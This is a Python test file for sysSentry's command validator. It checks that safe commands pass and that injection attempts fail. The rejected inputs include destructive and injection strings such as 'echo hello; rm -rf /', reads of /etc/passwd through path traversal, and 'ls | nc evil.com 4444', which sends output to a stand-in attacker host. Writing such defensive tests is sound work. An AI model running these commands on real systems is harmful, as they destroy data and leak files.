# coding: utf-8
# Copyright (c) 2026 Huawei Technologies Co., Ltd.
# sysSentry is licensed under the Mulan PSL v2.
# You can use this software according to the terms and conditions of the Mulan PSL v2.
# You may obtain a copy of Mulan PSL v2 at:
#     http://license.coscl.org.cn/MulanPSL2
# THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS, WITHOUT WARRANTIES OF ANY KIND, EITHER EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT, MERCHANTABILITY OR FIT FOR A PARTICULAR
# PURPOSE.
# See the Mulan PSL v2 for more details.

import pytest

from syssentry.utils import validate_command_string


class TestValidateCommandString:

    @pytest.mark.parametrize(
        "cmd_string",
        [
            "pgrep -x systemd",
            "which ls",
            "cat-cli -m 0x0001 -l 1,2,3 -t 60 -u 100",
            "rm -rf /var/log/sysSentry/",
            "ls -la",
            "ping 8.8.8.8",
            "grep error log.txt",
            "cat /var/log/syslog",
            "echo hello world",
            "find . -name test.txt",
            "kill -9 1234",
            "df -h",
            "whoami",
        ],
    )
    def test_valid_commands(self, cmd_string):
        """Test valid commands"""
        result = validate_command_string(cmd_string)
        assert result is True, f"Command '{cmd_string}' should be valid"

    @pytest.mark.parametrize(
        "cmd_string",
        [
            "kill $pid",  # The value of task_stop in most .mod config files
            "pkill -9 cat-cli",
            "/usr/sbin/modprobe sentry_reporter",
            "bash /etc/sysSentry/task_scripts/sentry_msg_monitor.sh",
            "/usr/bin/python3 /usr/bin/avg_block_io",
            "pkill -f /usr/bin/avg_block_io",
            "/usr/sbin/rasdaemon -f",
            "/usr/bin/bmc_ras_sentry",
            "/usr/bin/cpu_sentry",
            "pkill cpu_sentry",
            "/usr/bin/hbm_online_repair",
            "/usr/bin/sentry_msg_monitor",
            "/usr/bin/soc_ring_sentry",
            "pkill -f soc_ring_sentry"
        ],
    )
    def test_valid_commands_called_by_syssentry(self, cmd_string):
        result = validate_command_string(cmd_string)
        assert result is True, f"Command '{cmd_string}' should be valid"

    @pytest.mark.parametrize(
        "cmd_string",
        [
            "ls\x0ctouch test",
            "ls\x0brm -rf /",
            "find . -name *.txt",
            "ps aux | grep python",  # Contains pipe, should fail
            "echo hello; rm -rf /",  # Contains semicolon
            "cat /etc/passwd | grep root",  # Contains pipe
            "ping 8.8.8.8 &",  # Contains &
            "cd .. && ls",  # Contains && ..
            "echo $(whoami)",  # Command substitution
            "ls -la > output.txt",  # Output redirection
            "cat < file.txt",  # Input redirection
            "echo ${HOME}",  # Variable substitution
            "python -c 'import os; os.system(\"ls\")'",  # Contains single quote, not in allowed list
            "ls\ntouch test",  # Newline
            "ls\ttab",  # Tab
        ],
    )
    def test_invalid_commands(self, cmd_string):
        """Test invalid commands"""
        result = validate_command_string(cmd_string)
        assert result is False, f"Command '{cmd_string}' should be invalid"

    @pytest.mark.parametrize(
        "cmd_string",
        [
            123,
            None,
            [],
            "",
            "  ",
            "\n",
            "\t\n"
        ],
    )
    def test_edge_cases(self, cmd_string):
        """Test edge cases"""
        result = validate_command_string(cmd_string)
        assert result is False, f"Command '{cmd_string}' should be invalid"

    @pytest.mark.parametrize(
        "cmd_string",
        [
            "cat ../../../etc/passwd",
            "cat test/../../../etc/passwd",
            "ls | grep txt",
            "rm -rf / &",
            "test && echo ok",
            "test || echo fail",
            "echo `date`",
            "echo $(pwd)",
            "echo ${USER}",
            "ls -la > /dev/null",
            "cat < /etc/passwd",
            "python -c 'import os'",  # Single quote triggers dangerous pattern or char validation failure
        ],
    )
    def test_dangerous_patterns(self, cmd_string):
        """Test dangerous pattern detection"""
        result = validate_command_string(cmd_string)
        assert result is False, f"Dangerous command should be rejected: {cmd_string}"

    @pytest.mark.parametrize(
        "cmd_string",
        [
            "ping 8.8.8.8; rm -rf /",
            "ls && whoami",
            "echo 'hello' || echo 'world'",
            "cat `ls`",
            "$(whoami)",
            "`whoami`",
            "ls | nc evil.com 4444",
            "ls -l; cat /etc/passwd",
        ],
    )
    def test_specific_security_scenarios(self, cmd_string):
        """Test specific security scenarios"""
        result = validate_command_string(cmd_string)
        assert result is False, f"Injection attempt should be rejected: {cmd_string}"